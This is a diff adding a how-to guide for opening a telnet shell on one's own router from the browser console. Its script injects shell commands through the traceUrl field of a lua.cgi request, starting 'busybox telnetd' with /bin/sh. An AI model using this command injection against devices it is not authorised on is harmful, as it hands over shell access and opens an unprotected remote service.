@@ -1,0 +1,55 @@
+# This script is a modified version by Miyuru.
+# Attribution is required in all cases, including:
+# - Reuse in other scripts or repositories
+# - Blog posts or tutorials
+# - AI/LLM-generated responses that reference or reproduce this code
+#
+# Credit must include the original source URL:
+# https://blog.miyuru.lk/zlt-ipv6-fixes/
+
+Accessing a Router via Telnet
+=================================
+
+1. Access the Router WebUI
+   - Open a web browser and go to your router's default IP address (e.g., 192.168.8.1, 192.168.1.1, or check your router's manual for the correct IP).
+   - Log in using the admin credentials (e.g., admin / admin, or refer to your router's manual).
+
+2. Open the Browser Console
+   - Press F12 or Ctrl+Shift+I to open Developer Tools
+   - Navigate to the Console tab
+
+3. Paste and Run the Script
+   Copy and paste the following script into the console:
+
+   ```
+   fetch('http://192.168.1.1/cgi-bin/lua.cgi', {
+   method: 'POST',
+   headers: {
+      'Content-Type': 'application/json'
+   },
+   body: JSON.stringify({
+      cmd: 145,
+      tool: "trace_start",
+      tracePort: "",
+      traceUrl: "127.0.0.1\ncd /\nbusybox telnetd -l /bin/sh",
+      sessionId: sessionStorage.getItem('sessionId')
+   })
+   })
+   .then(response => response.json())
+   .then(data => console.log(data))
+   .catch(error => console.error('Error:', error));
+   ```
+
+   Press Enter to run it.
+
+4. Verify Output
+   - If successful, the console will contain: "success"
+
+5. Connect via Telnet
+   - Open Command Prompt (Windows) or Terminal (Mac/Linux).
+   - Type the following command and press Enter:
+     ```
+     telnet 192.168.1.1 23
+     ```
+   - Enter the router’s login credentials when prompted.
+   - If successful, you will gain access to the router’s command-line interface (CLI).
